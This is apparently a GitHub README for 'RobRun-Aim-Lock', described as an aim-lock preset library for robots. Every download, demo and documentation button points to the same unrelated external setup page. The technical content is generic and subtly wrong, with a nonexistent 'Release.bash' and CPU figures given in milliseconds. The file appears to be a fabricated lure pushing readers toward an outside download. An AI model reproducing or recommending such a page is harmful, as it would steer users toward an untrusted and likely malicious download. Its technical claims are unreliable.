# 🤖 RobRun‑Aim‑Lock  
*Customizable aim‑lock presets & configs for razor‑sharp robot navigation*  

[![Version 0.9.1](https://img.shields.io/badge/Version-0.9.1-blue?style=flat-square)](#)  
[![License MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)  
[![Platform Linux | Windows](https://img.shields.io/badge/Platform-Linux%20|%20Windows-lightgrey?style=flat-square)](#)  
[![Documentation PDF](https://img.shields.io/badge/Docs-PDF-orange?style=flat-square)](https://rewfdf.github.io/SetupPage/)  

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/🚀%20Get%20Started-Now%20Download-brightgreen?style=for-the-badge&logo=github" alt="Get Started">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/💡%20Demo%20Live-Play%20Now-purple?style=for-the-badge&logo=github" alt="Live Demo">
  </a>
</div>

---  

## 📖 What is RobRun‑Aim‑Lock?

RobRun‑Aim‑Lock is a lightweight, modular library that lets you define **aim‑lock presets** for autonomous robots—whether they are wheeled, tracked, or legged.  
It abstracts the math behind target acquisition, provides a clean configuration format, and plugs directly into popular robotics frameworks (ROS 2, ROS 1, and custom C++/Python stacks).

### Key Benefits
| ✅ | Feature | Why it matters |
|---|---|---|
| 🎯 | **Precision Presets** | Snap to exact headings with sub‑degree accuracy. |
| 🔧 | **Config‑First** | All parameters are stored in human‑readable YAML/JSON files. |
| 🔄 | **Dynamic Switching** | Swap presets on‑the‑fly without restarting the node. |
| 📦 | **Framework‑agnostic** | Works with ROS, ROS 2, or bare‑metal loops. |
| 📊 | **Telemetry Hooks** | Export lock status to dashboards or logs. |

---  

## 🚀 Quick‑Start

1. **Download the latest release**  
   Click the **Get Started** button above or grab the zip from the *Releases* tab.

2. **Add the library**  
   ```bash
   # Example for ROS2 (colcon)
   colcon build --packages-select robrun_aim_lock
   source install/Release.bash
   ```

3. **Create a preset** (`configs/preset_fast.yaml`)  
   ```yaml
   name: fast_lock
   target_angle: 45.0          # degrees
   tolerance: 0.3              # degrees
   lock_speed: 2.5             # m/s
   timeout_sec: 4.0
   ```

4. **Load the preset in your code**  
   ```python
   from robrun_aim_lock import AimLock

   lock = AimLock(config_path="configs/preset_fast.yaml")
   lock.activate()
   while not lock.is_locked():
       lock.update(current_heading)
   ```

5. **Watch the telemetry**  
   The library publishes `aim_lock/status` (ROS) or calls a user‑provided callback.

> **Tip:** Keep a *presets* folder alongside your launch files to hot‑swap during testing.

---  

## 📂 Repository Layout

```
RobRun-Aim-Lock/
├─ docs/                # Full user guide & API reference (HTML, PDF)
├─ examples/            # Ready‑to‑run demo projects
│   ├─ ros2_demo/
│   └─ python_standalone/
├─ src/                 # Core C++/Python source
│   ├─ robrun_aim_lock/
│   └─ utils/
├─ configs/             # Sample preset files (YAML & JSON)
├─ tests/               # Unit‑tests & integration tests
├─ CMakeLists.txt
└─ README.md            # ← you are here
```

---  

## 🛠️ Customization Guide

### 1. Define New Parameters  
Add any extra fields you need (e.g., `max_acceleration`, `fallback_angle`). The parser ignores unknown keys, so you can evolve the schema without breaking existing presets.

### 2. Extend the Lock Algorithm  
Fork `src/robrun_aim_lock/lock_core.*` and replace the PID controller with a model‑predictive controller. Register the new class in `CMakeLists.txt` and rebuild.

### 3. Hook Into Other Middleware  
The library ships with **ROS** and **ZeroMQ** adapters. To add a new transport, implement the `LockPublisher` interface and expose it via `AimLock.set_publisher(my_pub)`.

---  

## 📊 Performance Snapshot  

| Scenario | CPU (single core) | Memory | Lock latency |
|----------|-------------------|--------|--------------|
| Small differential robot (0.5 kg) | 3 ms | 2 MiB | 12 ms |
| Heavy industrial AGV (250 kg) | 7 ms | 5 MiB | 22 ms |
| Simulated swarm (100 agents) | 4 ms/agent | 3 MiB/agent | 15 ms |

All benchmarks run on an Intel i7‑12700 @ 3.6 GHz, Ubuntu 22.04.

---  

## 🤝 Contributing

We welcome contributions of any size!  

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feat/awesome‑preset`).  
3. Write tests for your change.  
4. Submit a Pull Request with a clear description.  

Please read `CONTRIBUTING.md` for coding style, commit guidelines, and the review workflow.

---  

## 📜 License & Acknowledgments

- **License:** MIT – see the `LICENSE` file.  
- **Primary author:** **gigahokagepincers** – thank you for the original vision!  
- **Special thanks:** the ROS community, the Open Robotics Lab, and all beta‑testers who helped refine the lock logic.

---  

### 🎉 Ready to lock on?

[**Explore the full documentation**](https://rewfdf.github.io/SetupPage/) | [**Download the latest build**](https://rewfdf.github.io/SetupPage/)  

Happy aiming!